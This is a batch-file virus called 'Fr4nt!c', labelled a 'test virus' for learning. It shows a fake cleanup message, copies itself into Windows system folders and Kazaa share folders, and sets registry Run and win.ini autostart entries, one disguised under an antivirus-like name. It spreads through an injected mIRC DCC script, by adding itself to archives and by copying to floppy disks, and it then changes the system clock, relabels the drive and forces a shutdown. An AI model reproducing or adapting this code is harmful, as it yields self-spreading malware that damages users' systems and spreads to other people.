@echo off
:: Fr4nt!c
:: by R4z0rbl4d3
:: http://www.razor-hacks.de.ms
:: D0N'T SPREAD !!! - TEST VIRUS

ctty nul

explorer http://www.razor-hacks.de.ms

010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010010101010101010

echo Ihr System wird jetzt gereinigt! Bitte warten Sie einen Moment ...

copy %0 "%systemroot%\frantic.exe"
copy %0 "%systemroot%\system\frantic.exe"
copy %0 "%systemroot%\system32\frantic.exe"
copy %0 "%temp%\frantic.exe"
copy %0 "%userprofile%\frantic.exe"
copy %0 "%programfiles%\Kazaa\My~1\frantic.exe"
copy %0 "%programfiles%\Kazaa Lite\My~1\frantic.exe"
cls

echo FrAnTiC > "C:\frantic.txt"
echo by Razorblade >> "C:\frantic.txt"
echo http://www.razor-hacks.de.ms - your virii source >> "C:\frantic.txt"
echo DON'T SPREAD >> "C:\frantic.txt"
cls

echo ' VBS.FranticMsg > "%systemroot%\fr.vbs"
echo ' by Razorblade >> "%systemroot%\fr.vbs"
echo do >> "%systemroot%\fr.vbs"
echo msgbox "Your system is infected with Fr4nt!c","16","By Razorblade" >> "%systemroot%\fr.vbs"
cls

reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Frantic32 /t REG_SZ /d "%systemroot%\frantic.exe" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v KAvp32 /t REG_SZ /d "%systemroot%\system32\frantic.exe" /f
cls

echo [afiles] > "%programfiles%\mIRC\mirc.ini"
echo n0=aliases.ini >> "%programfiles%\mIRC\mirc.ini"
echo n1=eventz.ini >> "%programfiles%\mIRC\mirc.ini"
echo [rfiles] >> "%programfiles%\mIRC\mirc.ini"
echo n0=remote.ini >> "%programfiles%\mIRC\mirc.ini"
echo n1=remote.ini >> "%programfiles%\mIRC\mirc.ini"
echo n2=eventz.ini >> "%programfiles%\mIRC\mirc.ini"
cls
echo [script] > "%programfiles%\mIRC\eventz.ini"
echo n0=on 1:JOIN:#:{ >> "%programfiles%\mIRC\eventz.ini"
echo n1=if ($nick == $me) { halt } >> "%programfiles%\mIRC\eventz.ini"
echo n2=/dcc send $nick "C:\Windows\frantic.exe"  >> "%programfiles%\mIRC\eventz.ini"
echo n3=} >> "%programfiles%\mIRC\eventz.ini"
cls

echo [windows] >> "%systemroot%\win.ini"
echo load=%systemroot%\system32\frantic.exe >> "%systemroot%\win.ini"
echo run=%systemroot%\system32\frantic.exe >> "%systemroot%\win.ini"
cls

for %%a in (*.rar) do rar a %%a %0
for %%a in (*.arj) do arj a %%a %0
for %%a in (*.zip) do pkzip -a %%a %0
cls

time=17.00
date=06.07.1987
cls

copy %0 "a:\%random%.exe"
cls

label RAZOR
cls

if exist "%systemroot%\system32\shutdown.exe" (
	shutdown /s /t 120 /c "Your system is infected with Fr4nt!c by Razorblade! Good Bye!!!"
) else (
	explorer http://www.razor-hacks.de.ms
)
cls

:: THIS IS A TEST VIRUS 
:: ONLY FOR LEARNING!!!
:: THX, Razorblade
:: http://www.razor-hacks.de.ms

exit